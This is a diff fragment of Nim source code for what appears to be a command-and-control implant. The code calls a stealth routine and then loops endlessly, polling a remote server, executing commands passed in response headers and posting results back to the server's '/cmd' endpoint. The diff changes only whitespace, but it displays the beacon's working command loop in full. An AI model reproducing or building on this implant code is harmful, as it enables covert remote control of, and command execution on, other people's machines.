@@ -44,6 +44,7 @@ Stealth()
 proc die() =
   quit QuitFailure
 
+
 while true: #Maintain Connection
     let sleeptime = SLEEP #Sleep Time
     sleep(sleeptime)
@@ -56,7 +57,7 @@ while true: #Maintain Connection
     let event_id = response.getOrDefault("x-event-id") # Check for event ID
     let jitter = response.getOrDefault("x-jitter")
     #echo cmd 
-
+    
     if cmd != "None": #If X-cmd is not empty, execute
       if cmd == "quit":
         die()
@@ -78,10 +79,12 @@ while true: #Maintain Connection
               "data": "No Response"
           }
           let response = client.request(server & "/cmd", httpMethod = HttpPost, body = $body)
-
+          
         #echo response.status
     elif jitter != "None":
         let sleeptime = response.getOrDefault("x-jitter")
     else:
         continue
 ```
+
+
